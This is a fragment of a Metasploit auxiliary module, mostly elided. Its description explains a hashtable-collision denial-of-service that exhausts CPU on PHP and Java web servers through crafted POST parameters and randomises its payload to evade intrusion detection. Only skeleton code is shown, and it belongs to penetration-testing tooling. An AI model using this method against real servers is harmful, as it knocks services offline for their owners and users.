...
class Metasploit3 < Msf::Auxiliary
	...
	def initialize(info = {})
		super(update_info(info,
			...
			'Description'   => %q{
				This module uses a denial-of-server (DoS) condition appearing in a variety of
				programming languages. This vulnerability occurs, when storing multiple values
				in a Hashtable and all values have the same hashvalue. This can cause a Webserver
				parsing the POST Parameters issued with a request into a Hashtable, to consume
				hours of CPU with a single HTTP request.

				Currently only the Hashfunctions for PHP and JAVA are implemented.
				This module was tested with PHP + httpd, Tomcat, Glassfish and Geronimo.
				It also generates a random Payload to bypass some IDS.
			},
			'Author'        =>
				[
	...
	def compute_collision_chars
		...
		if counter < datastore['collisionchars']
			...
			print_status("#{@recursive_counter}: Not enough values found. Trying it again...")
